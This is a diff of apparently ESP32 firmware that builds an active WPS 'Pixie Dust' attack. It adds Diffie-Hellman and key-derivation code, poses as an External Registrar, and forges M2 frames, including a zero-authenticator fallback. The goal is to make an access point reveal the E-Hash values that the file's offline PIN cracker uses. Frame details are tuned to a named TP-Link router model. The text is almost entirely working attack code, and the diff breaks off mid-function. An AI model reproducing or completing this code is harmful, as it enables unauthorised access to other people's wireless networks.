@@ -10,8 +10,215 @@
 #include "sniffer.h"
 #include <esp_wifi.h>
 #include <mbedtls/md.h>
+#include <mbedtls/bignum.h>
 
 extern bool showHiddenNetworks;
+
+// ============================================================
+// WPS DH group prime (RFC 3526, 1536-bit group 5)
+// ============================================================
+static const uint8_t WPS_DH_P[192] = {
+    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xC9,0x0F,0xDA,0xA2,0x21,0x68,0xC2,0x34,
+    0xC4,0xC6,0x62,0x8B,0x80,0xDC,0x1C,0xD1,0x29,0x02,0x4E,0x08,0x8A,0x67,0xCC,0x74,
+    0x02,0x0B,0xBE,0xA6,0x3B,0x13,0x9B,0x22,0x51,0x4A,0x08,0x79,0x8E,0x34,0x04,0xDD,
+    0xEF,0x95,0x19,0xB3,0xCD,0x3A,0x43,0x1B,0x30,0x2B,0x0A,0x6D,0xF2,0x5F,0x14,0x37,
+    0x4F,0xE1,0x35,0x6D,0x6D,0x51,0xC2,0x45,0xE4,0x85,0xB5,0x76,0x62,0x5E,0x7E,0xC6,
+    0xF4,0x4C,0x42,0xE9,0xA6,0x37,0xED,0x6B,0x0B,0xFF,0x5C,0xB6,0xF4,0x06,0xB7,0xED,
+    0xEE,0x38,0x6B,0xFB,0x5A,0x89,0x9F,0xA5,0xAE,0x9F,0x24,0x11,0x7C,0x4B,0x1F,0xE6,
+    0x49,0x28,0x66,0x51,0xEC,0xE4,0x5B,0x3D,0xC2,0x00,0x7C,0xB8,0xA1,0x63,0xBF,0x05,
+    0x98,0xDA,0x48,0x36,0x1C,0x55,0xD3,0x9A,0x69,0x16,0x3F,0xA8,0xFD,0x24,0xCF,0x5F,
+    0x83,0x65,0x5D,0x23,0xDC,0xA3,0xAD,0x96,0x1C,0x62,0xF3,0x56,0x20,0x85,0x52,0xBB,
+    0x9E,0xD5,0x29,0x07,0x70,0x96,0x96,0x6D,0x67,0x0C,0x35,0x4E,0x4A,0xBC,0x98,0x04,
+    0xF1,0x74,0x6C,0x08,0xCA,0x18,0x21,0x7C,0x32,0x90,0x5E,0x46,0x2E,0x36,0xCE,0x3B,
+};
+static const uint8_t WPS_DH_G[1] = {0x02};
+
+// ============================================================
+// DHM (Diffie-Hellman) state — generates PKR and shared secret
+// ============================================================
+static mbedtls_mpi g_dhP, g_dhG, g_dhX;
+static bool    g_dhmInited   = false;
+static uint8_t g_ourPkr[192];
+static uint8_t g_dhSecret[192];
+static size_t  g_dhSecretLen = 0;
+
+static void dhm_cleanup() {
+    if (g_dhmInited) {
+        mbedtls_mpi_free(&g_dhP);
+        mbedtls_mpi_free(&g_dhG);
+        mbedtls_mpi_free(&g_dhX);
+        g_dhmInited = false;
+    }
+    g_dhSecretLen = 0;
+}
+
+// Generate our Registrar PKR = (G^X) mod P with a random private key X.
+// Stores result in g_ourPkr[192].
+static bool dhm_setup() {
+    dhm_cleanup();
+    mbedtls_mpi_init(&g_dhP);
+    mbedtls_mpi_init(&g_dhG);
+    mbedtls_mpi_init(&g_dhX);
+    g_dhmInited = true;
+
+    if (mbedtls_mpi_read_binary(&g_dhP, WPS_DH_P, 192) != 0 ||
+        mbedtls_mpi_read_binary(&g_dhG, WPS_DH_G, 1)   != 0) {
+        Serial.println("[DH] Failed to load P/G");
+        dhm_cleanup(); return false;
+    }
+
+    uint8_t rand_buf[192];
+    esp_fill_random(rand_buf, 192);
+    // Ensure X is in valid range: reduce to < P-2 by clearing top bits
+    rand_buf[0] &= 0x7F;
+    if (mbedtls_mpi_read_binary(&g_dhX, rand_buf, 192) != 0) {
+        Serial.println("[DH] Failed to read X");
+        dhm_cleanup(); return false;
+    }
+
+    mbedtls_mpi GX, RR;
+    mbedtls_mpi_init(&GX);
+    mbedtls_mpi_init(&RR);
+    int ret = mbedtls_mpi_exp_mod(&GX, &g_dhG, &g_dhX, &g_dhP, &RR);
+    mbedtls_mpi_free(&RR);
+    if (ret != 0) {
+        Serial.println("[DH] PKR exponentiation failed");
+        mbedtls_mpi_free(&GX); dhm_cleanup(); return false;
+    }
+
+    memset(g_ourPkr, 0, 192);
+    ret = mbedtls_mpi_write_binary(&GX, g_ourPkr, 192);
+    mbedtls_mpi_free(&GX);
+    if (ret != 0) {
+        Serial.println("[DH] PKR export failed");
+        dhm_cleanup(); return false;
+    }
+    Serial.printf("[DH] PKR generated, first4=%02X%02X%02X%02X\n",
+                  g_ourPkr[0],g_ourPkr[1],g_ourPkr[2],g_ourPkr[3]);
+    return true;
+}
+
+// Compute shared secret = (apPke ^ X) mod P. Must call dhm_setup() first.
+static bool dhm_compute_secret(const uint8_t *apPke) {
+    if (!g_dhmInited) return false;
+
+    mbedtls_mpi apPKE, secret, RR;
+    mbedtls_mpi_init(&apPKE);
+    mbedtls_mpi_init(&secret);
+    mbedtls_mpi_init(&RR);
+
+    if (mbedtls_mpi_read_binary(&apPKE, apPke, 192) != 0) {
+        Serial.println("[DH] Failed to read AP PKE");
+        mbedtls_mpi_free(&apPKE); mbedtls_mpi_free(&secret); mbedtls_mpi_free(&RR);
+        return false;
+    }
+
+    int ret = mbedtls_mpi_exp_mod(&secret, &apPKE, &g_dhX, &g_dhP, &RR);
+    mbedtls_mpi_free(&RR);
+    if (ret != 0) {
+        Serial.println("[DH] Secret exponentiation failed");
+        mbedtls_mpi_free(&apPKE); mbedtls_mpi_free(&secret);
+        return false;
+    }
+
+    memset(g_dhSecret, 0, 192);
+    ret = mbedtls_mpi_write_binary(&secret, g_dhSecret, 192);
+    mbedtls_mpi_free(&apPKE); mbedtls_mpi_free(&secret);
+    if (ret != 0) {
+        Serial.println("[DH] Secret export failed");
+        return false;
+    }
+    g_dhSecretLen = 192;
+    Serial.printf("[DH] Shared secret first4=%02X%02X%02X%02X\n",
+                  g_dhSecret[0],g_dhSecret[1],g_dhSecret[2],g_dhSecret[3]);
+    return true;
+}
+
+static bool hmacSha256(const uint8_t *key, size_t keyLen,
+                       const uint8_t *msg, size_t msgLen,
+                       uint8_t *out) {
+    mbedtls_md_context_t ctx;
+    mbedtls_md_init(&ctx);
+    const mbedtls_md_info_t *info = mbedtls_md_info_from_type(MBEDTLS_MD_SHA256);
+    if (!info) return false;
+    if (mbedtls_md_setup(&ctx, info, 1) != 0) { mbedtls_md_free(&ctx); return false; }
+    bool ok = (mbedtls_md_hmac_starts(&ctx, key, keyLen)  == 0 &&
+               mbedtls_md_hmac_update(&ctx, msg, msgLen)  == 0 &&
+               mbedtls_md_hmac_finish(&ctx, out)          == 0);
+    mbedtls_md_free(&ctx);
+    return ok;
+}
+
+
+// ============================================================
+// Derive AuthKey from DH shared secret (WPS KDF, §6.5)
+// AuthKey = KDF(DHKey, "Wi-Fi Easy and Secure Key Derivation",
+//               E-Nonce || Enrollee-MAC || R-Nonce)[0:32]
+// where DHKey = SHA-256(g_dhSecret)
+// ============================================================
+static bool deriveAuthKeyFromDH(const uint8_t *eNonce,
+                                 const uint8_t *enrolleeMacB,
+                                 const uint8_t *rNonce,
+                                 uint8_t       *authKeyOut) {
+    if (g_dhSecretLen == 0) return false;
+
+    // DHKey = SHA-256(g_dhSecret)
+    uint8_t dhKey[32];
+    {
+        mbedtls_md_context_t ctx;
+        mbedtls_md_init(&ctx);
+        const mbedtls_md_info_t *info = mbedtls_md_info_from_type(MBEDTLS_MD_SHA256);
+        if (!info || mbedtls_md_setup(&ctx, info, 0) != 0) { mbedtls_md_free(&ctx); return false; }
+        mbedtls_md_starts(&ctx);
+        mbedtls_md_update(&ctx, g_dhSecret, 192);
+        mbedtls_md_finish(&ctx, dhKey);
+        mbedtls_md_free(&ctx);
+    }
+
+    // WPS PRF-256: HMAC-SHA256(DHKey, counter(1) || label || 0x00 || data || reqLen(2))
+    // counter=0x01, label="Wi-Fi Easy and Secure Key Derivation"
+    // data = E-Nonce(16) || Enrollee-MAC(6) || R-Nonce(16)
+    // reqLen = 0x0100 (256 bits = AuthKey size)
+    const uint8_t label[] = "Wi-Fi Easy and Secure Key Derivation";
+    uint8_t prfInput[1 + sizeof(label) + 1 + 16 + 6 + 16 + 2];
+    int pi = 0;
+    prfInput[pi++] = 0x01;                               // counter
+    memcpy(prfInput+pi, label, sizeof(label)-1); pi += sizeof(label)-1;
+    prfInput[pi++] = 0x00;                               // separator
+    memcpy(prfInput+pi, eNonce,      16); pi += 16;
+    memcpy(prfInput+pi, enrolleeMacB, 6); pi += 6;
+    memcpy(prfInput+pi, rNonce,      16); pi += 16;
+    prfInput[pi++] = 0x01;                               // reqLen hi = 256 >> 8
+    prfInput[pi++] = 0x00;                               // reqLen lo
+
+    return hmacSha256(dhKey, 32, prfInput, pi, authKeyOut);
+}
+
+// ============================================================
+// Compute M2 Authenticator = HMAC-SHA256(AuthKey, M1_body || M2_body)[0:8]
+// Per WPS spec §7.4: Authenticator covers all WPS TLVs in M1 and M2
+// (excluding the Authenticator TLV itself).
+// ============================================================
+static bool computeAuthenticator(const uint8_t *authKey,
+                                  const uint8_t *m1Body, int m1BodyLen,
+                                  const uint8_t *m2Body, int m2BodyLen,
+                                  uint8_t       *authOut8) {
+    // Input = M1_WPS_body || M2_WPS_body (concatenated)
+    int totalLen = m1BodyLen + m2BodyLen;
+    uint8_t *buf = (uint8_t*)malloc(totalLen);
+    if (!buf) return false;
+    memcpy(buf,           m1Body, m1BodyLen);
+    memcpy(buf+m1BodyLen, m2Body, m2BodyLen);
+
+    uint8_t hmacOut[32];
+    bool ok = hmacSha256(authKey, 32, buf, totalLen, hmacOut);
+    free(buf);
+    if (!ok) return false;
+    memcpy(authOut8, hmacOut, 8);   // first 8 bytes only
+    return true;
+}
+
+
 
 // ============================================================
 // Helpers
@@ -62,20 +269,7 @@ void savePixieData() {
 // Pixie Dust solver (HMAC-SHA256 based)
 // ============================================================
 
-static bool hmacSha256(const uint8_t *key, size_t keyLen,
-                       const uint8_t *msg, size_t msgLen,
-                       uint8_t *out) {
-    mbedtls_md_context_t ctx;
-    mbedtls_md_init(&ctx);
-    const mbedtls_md_info_t *info = mbedtls_md_info_from_type(MBEDTLS_MD_SHA256);
-    if (!info) return false;
-    if (mbedtls_md_setup(&ctx, info, 1) != 0) { mbedtls_md_free(&ctx); return false; }
-    bool ok = (mbedtls_md_hmac_starts(&ctx, key, keyLen)  == 0 &&
-               mbedtls_md_hmac_update(&ctx, msg, msgLen)  == 0 &&
-               mbedtls_md_hmac_finish(&ctx, out)          == 0);
-    mbedtls_md_free(&ctx);
-    return ok;
-}
+
 
 static const uint8_t WEAK_ES[][16] = {
     {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0},
@@ -95,6 +289,9 @@ static void buildHashInput(const uint8_t *es, uint32_t psk,
     memcpy(buf+20, pke, 192);
     memcpy(buf+212, pkr, 192);
 }
+
+// Forward declaration: wps_reassembly_reset() is defined in sniffer.cpp
+void wps_reassembly_reset();
 
 static int crackHalf(const uint8_t *es, const uint8_t *authKey,
                      const uint8_t *targetHash,
@@ -241,7 +438,7 @@ String runPixieDustCalculation(const String & /*bssid*/) {
 //   4. Wait for Assoc Response
 //   5. Send EAPOL-Start
 //   6. AP sends EAP-Request/Identity
-//   7. Send EAP-Response/Identity ("WFA-SimpleConfig-Enrollee-1-0")
+//   3. Send EAP-Response/Identity ("WFA-SimpleConfig-Registrar-1-0") [PROACTIVE]
 //   8. AP starts WPS: sends WSC-Start → M1 from us → M2 from AP
 //   9. Sniffer captures M1 (our PKE, E-Nonce) and M2 (AP's PKR, R-Nonce,
 //      E-Hash1, E-Hash2) — these are the pixie dust fields
@@ -373,26 +570,25 @@ static int buildAssocFrame(uint8_t *buf, const uint8_t *apBssid,
     memcpy(buf+pos, rates, sizeof(rates)); pos+=sizeof(rates);
     // DS Parameter Set
     buf[pos++]=0x03; buf[pos++]=0x01; buf[pos++]=channel;
-    // WPS IE: OUI 00:50:F2:04, advertise PIN enrollee
+    // WPS IE for Registrar role — exact bytes from oneshot pcap:
+    // DD 18 00 50 F2 04  (vendor-specific, WPS OUI)
+    //   10 4A 00 01 10   Version=1.0
+    //   10 3A 00 01 02   RequestType=0x02 (External Registrar) ← KEY difference
+    //   10 49 00 06 00 37 2A 00 01 20  VendorExtension
     const uint8_t wpsIe[] = {
         0xDD,               // vendor-specific tag
-        0x1A,               // length = 26 bytes of payload (recalculated below)
+        0x18,               // length = 24 bytes of payload
         0x00,0x50,0xF2,0x04,// WPS OUI
-        0x10,0x4A,          // attr: Version (0x104A)
+        0x10,0x4A,          // Version (0x104A)
         0x00,0x01,0x10,     // len=1, value=1.0
-        0x10,0x12,          // attr: Device Password ID (0x1012)
-        0x00,0x02,          // len=2
-        0x00,0x00,          // Default PIN (0x0000 per WPS spec Table E-6)
-        0x10,0x3C,          // attr: RF Bands (0x103C)
-        0x00,0x01,0x01,     // len=1, 2.4GHz
-        0x10,0x49,          // attr: Vendor Extension
+        0x10,0x3A,          // RequestType (0x103A)
+        0x00,0x01,0x02,     // len=1, value=0x02 = External Registrar
+        0x10,0x49,          // VendorExtension (0x1049)
         0x00,0x06,          // len=6
         0x00,0x37,0x2A,     // Wi-Fi Alliance OUI
         0x00,0x01,0x20      // version2=2.0
     };
     memcpy(buf+pos, wpsIe, sizeof(wpsIe)); pos+=sizeof(wpsIe);
-    // Fix the WPS IE length byte to actual payload after the tag+len bytes
-    buf[pos - sizeof(wpsIe) + 1] = (uint8_t)(sizeof(wpsIe) - 2);
     return pos;
 }
 
@@ -416,9 +612,11 @@ static int buildEapolStart(uint8_t *buf, const uint8_t *apBssid) {
 }
 
 // Build EAP-Response/Identity
-// Identity string used by WPS enrollees: "WFA-SimpleConfig-Enrollee-1-0"
+// Identity string for WPS External Registrar: "WFA-SimpleConfig-Registrar-1-0"
+// This tells the AP we are the Registrar — the AP will then act as Enrollee,
+// send M1 first, and we respond with M2.
 static int buildEapIdentityResponse(uint8_t *buf, const uint8_t *apBssid, uint8_t eapId) {
-    const char identity[] = "WFA-SimpleConfig-Enrollee-1-0";
+    const char identity[] = "WFA-SimpleConfig-Registrar-1-0";
     uint8_t idLen = (uint8_t)strlen(identity);
     // EAP total length: code(1)+id(1)+length(2)+type(1)+identity = 5+idLen
     uint16_t eapLen = 5 + idLen;
@@ -446,8 +644,8 @@ static int buildEapIdentityResponse(uint8_t *buf, const uint8_t *apBssid, uint8_
     return 43 + idLen;
 }
 
-// Build EAP-Response/NAK (gracefully terminate after M2 capture)
-static int buildEapNak(uint8_t *buf, const uint8_t *apBssid, uint8_t eapId) {
+// Build EAP-Response/NAK (kept for reference, not used in registrar flow)
+static int __attribute__((unused)) buildEapNak(uint8_t *buf, const uint8_t *apBssid, uint8_t eapId) {
     // EAP NAK = code 2 (Response), type 3 (NAK), desired auth type = 0
     uint16_t eapLen = 6;
     buf[0]=0x88; buf[1]=0x01; // QoS Data, ToDS=1
@@ -471,7 +669,29 @@ static int buildEapNak(uint8_t *buf, const uint8_t *apBssid, uint8_t eapId) {
 
 // ============================================================
 // Build WSC-ACK: EAP-Response, Expanded type, Op-Code 0x00, no body.
-static int buildWscAck(uint8_t *buf, const uint8_t *apBssid, uint8_t eapId) {
+// Build WSC_NACK frame — sent to terminate a WPS session cleanly.
+// Op-Code 0x03 = WSC_NACK.  Payload is empty (no WPS TLVs needed).
+static int buildWscNack(uint8_t *buf, const uint8_t *apBssid, uint8_t eapId) {
+    const uint16_t eapLen = (uint16_t)(4 + 10);  // EAP hdr + expanded prefix (no payload)
+    buf[0]=0x88; buf[1]=0x01; buf[2]=0x2C; buf[3]=0x00;
+    memcpy(buf+4, apBssid, 6); memcpy(buf+10, enrolleeMac, 6); memcpy(buf+16, apBssid, 6);
+    applySeq(buf);
+    buf[24]=0x00; buf[25]=0x00;  // QoS ctrl
+    buf[26]=0xAA; buf[27]=0xAA; buf[28]=0x03;
+    buf[29]=0x00; buf[30]=0x00; buf[31]=0x00;
+    buf[32]=0x88; buf[33]=0x8E;
+    buf[34]=0x01; buf[35]=0x00;  // EAPOL ver + type=EAP
+    buf[36]=(eapLen>>8)&0xFF; buf[37]=eapLen&0xFF;
+    buf[38]=0x02; buf[39]=eapId; // EAP Response
+    buf[40]=(eapLen>>8)&0xFF; buf[41]=eapLen&0xFF;
+    buf[42]=0xFE;                // Expanded type
+    buf[43]=0x00; buf[44]=0x37; buf[45]=0x2A;  // WFA Vendor-ID
+    buf[46]=0x00; buf[47]=0x00; buf[48]=0x00; buf[49]=0x01;  // Vendor-Type
+    buf[50]=0x03; buf[51]=0x00;  // Op-Code=WSC_NACK(0x03), Flags=0x00
+    return 52;
+}
+
+static int __attribute__((unused)) buildWscAck(uint8_t *buf, const uint8_t *apBssid, uint8_t eapId) {
     const uint16_t eapLen = (uint16_t)(4 + 10);
     buf[0]=0x88; buf[1]=0x01; buf[2]=0x2C; buf[3]=0x00;
     memcpy(buf+4, apBssid, 6); memcpy(buf+10, enrolleeMac, 6); memcpy(buf+16, apBssid, 6);
@@ -497,7 +717,7 @@ static int buildWscAck(uint8_t *buf, const uint8_t *apBssid, uint8_t eapId) {
 // Returns the total frame size written into *out (heap-allocated).
 // Caller must free().
 // ============================================================
-static uint8_t *buildM1Frame(const uint8_t *apBssid, uint8_t eapId,
+static uint8_t * __attribute__((unused)) buildM1Frame(const uint8_t *apBssid, uint8_t eapId,
                               int *outLen,
                               uint8_t *pkeOut, uint8_t *eNonceOut) {
     // Generate random Enrollee Nonce (16 bytes)
@@ -684,6 +904,152 @@ static uint8_t *buildM1Frame(const uint8_t *apBssid, uint8_t eapId,
 }
 
 // ============================================================
+// Null frame (power-save bit set) — sent before EAPOL-Start
+// to wake up the AP's power-save buffer for our MAC.
+// FC: type=Data(2), subtype=Null(4), ToDS=1, PM=1
+// ============================================================
+static int buildNullFrame(uint8_t *buf, const uint8_t *apBssid) {
+    // FC byte 0: subtype(4)=0100, type(2)=10, ver=00  → 0x48
+    // FC byte 1: ToDS=1, FromDS=0, PM=1               → 0x11
+    buf[0]=0x48; buf[1]=0x11;
+    buf[2]=0x00; buf[3]=0x00; // duration
+    memcpy(buf+4,  apBssid,    6); // addr1 = AP (BSSID)
+    memcpy(buf+10, enrolleeMac,6); // addr2 = STA (us)
+    memcpy(buf+16, apBssid,    6); // addr3 = BSSID
+    applySeq(buf);   // buf[22..23] = incrementing sequence control
+    return 24;
+}
+
+// ============================================================
+// Build WPS M2 frame (Registrar → AP-Enrollee)
+// Sent in response to AP's M1.
+//
+// apEnrolleeNonce: 16 bytes echoed from AP's M1 (0x101A)
+// apEapId:         EAP id from the AP's M1 frame
+// ourPkrIn:        our 192-byte Registrar public key (from g_ourPkr)
+// rNonceOut:       16-byte Registrar nonce we generate (caller saves it)
+// authKey:         32-byte AuthKey derived from DH (for Authenticator HMAC)
+// m1WpsBody:       raw WPS TLV body from AP's M1 (for Authenticator input)
+// m1WpsLen:        length of m1WpsBody
+// ============================================================
+static uint8_t *buildM2Frame(const uint8_t *apBssid,
+                              uint8_t        apEapId,
+                              const uint8_t *apEnrolleeNonce,
+                              const uint8_t *ourPkrIn,
+                              uint8_t       *rNonceOut,
+                              int           *outLen,
+                              const uint8_t *authKey,
+                              const uint8_t *m1WpsBody,
+                              int            m1WpsLen) {
+    // Generate Registrar Nonce and UUID-R
+    uint8_t rNonce[16], uuidR[16];
+    for (int i = 0; i < 16; i++) rNonce[i]  = (uint8_t)esp_random();
+    for (int i = 0; i < 16; i++) uuidR[i]   = (uint8_t)esp_random();
+    memcpy(rNonceOut, rNonce, 16);
+
+    const uint8_t version[]       = {0x10};
+    const uint8_t msgType[]       = {0x05};           // M2
+    const uint8_t authTypeFlags[] = {0x00,0x23};
+    const uint8_t encrType[]      = {0x00,0x0D};
+    const uint8_t encrTypeFlags[] = {0x01};
+    const uint8_t configMethods[] = {0x31,0x08};
+    const uint8_t space1[]        = {0x20};
+    const uint8_t primDevType[]   = {0,0,0,0,0,0,0,0};
+    const uint8_t rfBands[]       = {0x01};
+    const uint8_t assocState[]    = {0x00,0x00};
+    const uint8_t configError[]   = {0x00,0x00};
+    const uint8_t devPassId[]     = {0x00,0x00};
+    const uint8_t osVersion[]     = {0x80,0x00,0x00,0x00};
+    const uint8_t vendorExt[]     = {0x00,0x37,0x2A,0x00,0x01,0x20};
+    const uint8_t zeroAuth[8]     = {0};
+
+    const int MAX_WPS = 700;
+    uint8_t *wpsBody = (uint8_t*)malloc(MAX_WPS);
+    if (!wpsBody) { *outLen=0; return nullptr; }
+    int wp = 0;
+
+    auto putTlv = [&](uint16_t type, const uint8_t *val, uint16_t vlen) {
+        if (wp + 4 + vlen > MAX_WPS) return;
+        wpsBody[wp++]=(type>>8)&0xFF; wpsBody[wp++]=type&0xFF;
+        wpsBody[wp++]=(vlen>>8)&0xFF; wpsBody[wp++]=vlen&0xFF;
+        memcpy(wpsBody+wp, val, vlen); wp+=vlen;
+    };
+
+    putTlv(0x104A, version,        sizeof(version));
+    putTlv(0x1022, msgType,        sizeof(msgType));
+    putTlv(0x101A, apEnrolleeNonce,16);   // echo AP's E-Nonce
+    putTlv(0x1039, rNonce,         16);
+    putTlv(0x1048, uuidR,          16);
+    putTlv(0x1032, ourPkrIn,      192);
+    putTlv(0x1004, authTypeFlags,  sizeof(authTypeFlags));
+    putTlv(0x1010, encrType,       sizeof(encrType));
+    putTlv(0x100D, encrTypeFlags,  sizeof(encrTypeFlags));
+    putTlv(0x1008, configMethods,  sizeof(configMethods));
+    putTlv(0x1021, space1,         1);
+    putTlv(0x1023, space1,         1);
+    putTlv(0x1024, space1,         1);
+    putTlv(0x1042, space1,         1);
+    putTlv(0x1054, primDevType,    8);
+    putTlv(0x1011, space1,         1);
+    putTlv(0x103C, rfBands,        sizeof(rfBands));
+    putTlv(0x1002, assocState,     sizeof(assocState));
+    putTlv(0x1009, configError,    sizeof(configError));
+    putTlv(0x1012, devPassId,      sizeof(devPassId));
+    putTlv(0x102D, osVersion,      sizeof(osVersion));
+    putTlv(0x1049, vendorExt,      sizeof(vendorExt));
+
+    // Compute Authenticator = HMAC-SHA256(AuthKey, M1_body || M2_body_so_far)[0:8]
+    // M2_body_so_far = wpsBody up to (but not including) the Authenticator TLV.
+    uint8_t computedAuth[8];
+    if (authKey && m1WpsBody && m1WpsLen > 0 &&
+        computeAuthenticator(authKey, m1WpsBody, m1WpsLen, wpsBody, wp, computedAuth)) {
+        putTlv(0x1005, computedAuth, 8);
+        Serial.printf("[DH] Authenticator: %s\n", bytesToHex(computedAuth,8).c_str());
+    } else {
+        // Fallback: zero authenticator (some APs tolerate it for M3 exposure)
+        putTlv(0x1005, zeroAuth, 8);
+        Serial.println("[DH] WARNING: using zero Authenticator (DH not ready)");
+    }
+
+    // Frame assembly — standard WFA format (no TP-Link session token in M2).
+    // The session token is an AP-side concept used in WSC-Start; our M2 as
+    // Registrar uses the plain WFA Expanded header: VID(3)+VType(4)+Op(1)+Flags(1)+MsgLen(2).
+    // expandedPrefix = type(1=0xFE) + VID(3) + VType(4) + Op(1) + Flags(1) + MsgLen(2) = 12
+    int expandedPrefix = 12;
+    uint16_t wpsBodyLen = (uint16_t)wp;
+    uint16_t eapLen  = (uint16_t)(4 + expandedPrefix + wp);
+    int totalLen     = 26 + 8 + 4 + eapLen;
+    uint8_t *frame   = (uint8_t*)malloc(totalLen);
+    if (!frame) { free(wpsBody); *outLen=0; return nullptr; }
+
+    int pos = 0;
+    frame[pos++]=0x88; frame[pos++]=0x01; frame[pos++]=0x2C; frame[pos++]=0x00;
+    memcpy(frame+pos, apBssid,    6); pos+=6;
+    memcpy(frame+pos, enrolleeMac,6); pos+=6;
+    memcpy(frame+pos, apBssid,    6); pos+=6;
+    { uint16_t sc=nextSeqCtrl(); frame[pos++]=sc&0xFF; frame[pos++]=(sc>>8)&0xFF; }
+    frame[pos++]=0x00; frame[pos++]=0x00;
+    frame[pos++]=0xAA; frame[pos++]=0xAA; frame[pos++]=0x03;
+    frame[pos++]=0x00; frame[pos++]=0x00; frame[pos++]=0x00;
+    frame[pos++]=0x88; frame[pos++]=0x8E;
+    frame[pos++]=0x01; frame[pos++]=0x00;
+    frame[pos++]=(eapLen>>8)&0xFF; frame[pos++]=eapLen&0xFF;
+    frame[pos++]=0x02; frame[pos++]=apEapId;
+    frame[pos++]=(eapLen>>8)&0xFF; frame[pos++]=eapLen&0xFF;
+    frame[pos++]=0xFE;                                        // EAP type: Expanded
+    frame[pos++]=0x00; frame[pos++]=0x37; frame[pos++]=0x2A; // WFA Vendor-ID
+    frame[pos++]=0x00; frame[pos++]=0x00; frame[pos++]=0x00; frame[pos++]=0x01; // Vendor-Type
+    frame[pos++]=0x04;   // Op-Code WSC_MSG
+    frame[pos++]=0x02;   // Flags: Message-Length present
+    frame[pos++]=(wpsBodyLen>>8)&0xFF; frame[pos++]=wpsBodyLen&0xFF;
+    memcpy(frame+pos, wpsBody, wp); pos+=wp;
+    assert(pos == totalLen);
+    free(wpsBody);
+    *outLen = pos;
+    return frame;
+}
+
+// ============================================================
 // Active WPS exchange state machine
 // ============================================================
 
@@ -694,7 +1060,8 @@ enum class WpsProbeState : uint8_t {
     EapolStartSent,
     WaitingIdentityReq,
     IdentityRespSent,
-    WaitingM2,    // WSC-Start received; sniffer is capturing M1/M2
+    WaitingApM1,     // sent Identity; waiting for AP to send M1 (Registrar flow)
+    WaitingApM3,     // sent M2; waiting for AP to send M3 with E-Hash1/E-Hash2
     Done,
     Failed,
 };
@@ -706,9 +1073,11 @@ PixieData pixieCapture;
 static volatile WpsProbeState g_wpsState       = WpsProbeState::Idle;
 static volatile uint8_t       g_identityReqId  = 0;  // FIX: capture FIRST EAP-Req/Identity id, protect from retransmits
 static volatile uint8_t       g_lastEapId      = 0;  // updated during M1/M2 phase, used for M1 id = lastEapId+1
+static volatile uint8_t g_apM1EapId = 0;
 static volatile bool          g_gotAuthResp    = false;
 static volatile bool          g_gotAssocResp   = false;
 static volatile bool          g_gotEapIdReq    = false;
+
 
 // ============================================================
 // Promiscuous callback used during the active probe.
@@ -785,64 +1154,97 @@ static void wpsProbeSnifferCb(void *buf, wifi_promiscuous_pkt_type_t type) {
             if (eapCode == 0x01) { // EAP-Request from AP
                 if (eapType == 0x01) {
                     // EAP-Request/Identity — update g_lastEapId on EVERY retransmit.
-                    // The AP increments its EAP ID on each retransmit. We must echo
-                    // back the LATEST id in our Identity Resp, not the first one seen.
-                    // g_identityReqId is kept for diagnostics only.
                     if (!g_gotEapIdReq) {
                         g_identityReqId = eapId;
                         Serial.println("[WPS-Probe] Got EAP-Req/Identity");
                     }
-                    g_lastEapId   = eapId;  // always track latest — used for Identity Resp
+                    g_lastEapId   = eapId;
                     g_gotEapIdReq = true;
                 }
+            }
+            if (eapCode == 0x01 || eapCode == 0x02) { // Request OR Response — AP M1 uses code=2
                 if (eapType == 0xFE) {
-                    // EAP-Request/Expanded — detect WSC-Start.
-                    // Update g_lastEapId here so Identity-Resp doesn't clobber it
-                    // This AP uses three outer Vendor-ID formats:
-                    //   00:37:2A — standard WFA; Op at wsOffset+7
-                    //   2A:00:01 — double-wrap; inner OUI 37:2A:00 at wsOffset+9,
-                    //              inner Op at wsOffset+9+7 = wsOffset+16
-                    //   00:01:01 — WSC-Start shell; tiny 4-byte payload 37:2A:00:00,
-                    //              no inner TLVs; ANY op on this outer vid = WSC-Start
-                    int wsOffset = offset + 5; // right after EAP type byte (0xFE)
+                    // EAP-Request/Expanded from AP — detect messages in Registrar flow.
+                    // TP-Link WR840N inserts a 4-byte random session token between
+                    // the 0xFE type byte and the WFA Vendor-ID (00:37:2A).
+                    // wsOffset points to the first byte AFTER 0xFE.
+                    int wsOffset = offset + 5;
                     if (wsOffset + 3 > len) return;
 
-                    bool isStdWfa    = (p[wsOffset]==0x00 && p[wsOffset+1]==0x37 && p[wsOffset+2]==0x2A);
-                    bool isDblWrap   = (p[wsOffset]==0x2A && p[wsOffset+1]==0x00 && p[wsOffset+2]==0x01);
-                    bool isShell     = (p[wsOffset]==0x00 && p[wsOffset+1]==0x01 && p[wsOffset+2]==0x01);
-                    bool isTPLink = (wsOffset + 10 <= len && p[wsOffset+4] == 0x00 && p[wsOffset+5] == 0x37 && p[wsOffset+6] == 0x2A);
+                    bool isTPLink = (wsOffset + 10 <= len &&
+                                     p[wsOffset+4]==0x00 && p[wsOffset+5]==0x37 && p[wsOffset+6]==0x2A);
+                    bool isStdWfa = (p[wsOffset]==0x00 && p[wsOffset+1]==0x37 && p[wsOffset+2]==0x2A);
+                    bool isDblWrap= (p[wsOffset]==0x2A && p[wsOffset+1]==0x00 && p[wsOffset+2]==0x01);
+                    bool isShell  = (p[wsOffset]==0x00 && p[wsOffset+1]==0x01 && p[wsOffset+2]==0x01);
 
+                    // Resolve opcode based on format
                     uint8_t opcode = 0;
-
-                    if (isTPLink && wsOffset + 10 <= len) {
-                        opcode = p[wsOffset + 9];
-                    }
-
-                    if (isStdWfa && wsOffset + 8 <= len) {
-                        opcode = p[wsOffset + 7];  // VID(3)+VType(4) → Op
-                    } else if (isDblWrap && wsOffset + 17 <= len) {
-                        // inner: at wsOffset+9, OUI=37:2A:00, then VType-like(3), then Op
-                        if (p[wsOffset+9]==0x37 && p[wsOffset+10]==0x2A && p[wsOffset+11]==0x00) {
-                            opcode = p[wsOffset + 9 + 6]; // inner OUI(3)+VTypeLike(3) → Op
-                        }
+                    int     tlvOff = 0;  // offset into (p+offset+5) where WPS TLVs begin
+                    if (isTPLink) {
+                        // token(4)+VID(3)+VType(4)+op(1)+flags(1) = 13, optional msglen(2)
+                        opcode = (wsOffset+12 < len) ? p[wsOffset+12] : 0;
+                        uint8_t flags = (wsOffset+13 < len) ? p[wsOffset+13] : 0;
+                        tlvOff = 14 + (flags & 0x02 ? 2 : 0);
+                    } else if (isStdWfa) {
